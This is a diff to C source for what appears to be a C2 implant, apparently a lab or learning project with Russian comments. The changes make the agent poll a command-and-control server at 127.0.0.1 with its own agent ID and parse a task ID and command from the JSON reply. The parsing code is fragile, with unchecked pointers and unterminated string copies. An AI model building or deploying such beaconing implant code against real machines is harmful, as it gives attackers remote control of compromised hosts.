@@ -38,18 +38,22 @@ static int http_init(void) {
     }
 
     printf("[+/HTTP] Initialization success. Connect to c2.\n");
+    fflush(stdout);
+    sleep(1);
 
     return 0;
 }
 
 //if return 0 - success
-static int http_get_command(char* command, size_t max_len_command) {
+//command, task_id - выходные аргументы
+static int http_get_command(char* command, char* task_id,  size_t max_len_command, char* agent_id) {
     char buf[2048] = {0};
     snprintf(buf, 
             sizeof(buf),
-            "GET /get_task/task_2 HTTP/1.1\r\n"
+            "GET /get_task/%s HTTP/1.1\r\n"
             "Host: 127.0.0.1\r\n"
-            "Connection: close\r\n\r\n");
+            "Connection: close\r\n\r\n",
+            agent_id);
 
     if(send(current_sockfd, buf, sizeof(buf), 0) == -1) {
         error_exit("send/HTTP");
@@ -62,29 +66,59 @@ static int http_get_command(char* command, size_t max_len_command) {
 
     //for reliability
     buf[count_bytes] = '\0';
-
-    //parse answer for c2
+    printf("[DEBUG] Запрос: %s\n", buf);
+    //parse answer for c2(task_id)
     char* body = strstr(buf, "\r\n\r\n");
     if(body != NULL) {
         body += 4;
     }
     body = strchr(body, '\"');
     if(body != NULL) {
-        body += 1;
+        body++;
     }
-    for(int i = strlen(body) - 1; i >= 0; --i) {
-        if(body[i] == '\"') {
-            body[i] = '\0';
-            break;
+    if(body[0] == 't' && body[1] == 'a' && body[2] == 's' && body[3] == 'k' && body[4] == '_' && body[5] == 'i' && body[6] == 'd' && body[7] == '\"') {
+        body += 9; 
+        if(body[0] == 'n' && body[1] == 'u' && body[2] == 'l' && body[3] == 'l') {
+            printf("[+/HTTP] No tasks for working.\n");
+            fflush(stdout);
+            sleep(1);
+            return 1;
         }
+        for(int i = 0; i < strlen(body) - 1; ++i) {
+            if(body[i] == ',') {
+                body[i] = '\0';
+                break;
+            }
+        }
+    } else {
+        printf("[-/HTTP] Error parse task_id form json.\n");
+        return 1;
     }
 
     if(strlen(body) >= max_len_command) {
         error_exit("command_len/HTTP");
     }
+    strncpy(task_id, body, strlen(body));
+
+    //parse answer for c2(command)
+    body += (strlen(body) + 2);
+    if(body[0] == 't' && body[1] == 'a' && body[2] == 's' && body[3] == 'k' && body[4] == '\"') {
+        body += 7; 
+        for(int i = strlen(body) - 1; i >= 0; --i) {
+            if(body[i] == '\"') {
+                body[i] = '\0';
+                break;
+            }
+        }
+    } else {
+        printf("[-/HTTP] Error parse task form json.\n");
+    }
+
     strncpy(command, body, strlen(body));
 
-    printf("[+/HTTP] Command fetch from c2 success.\n"); 
+    printf("[+/HTTP] Command fetch from c2 success.\n");
+    fflush(stdout);
+    sleep(1);
 
     return 0;
 }
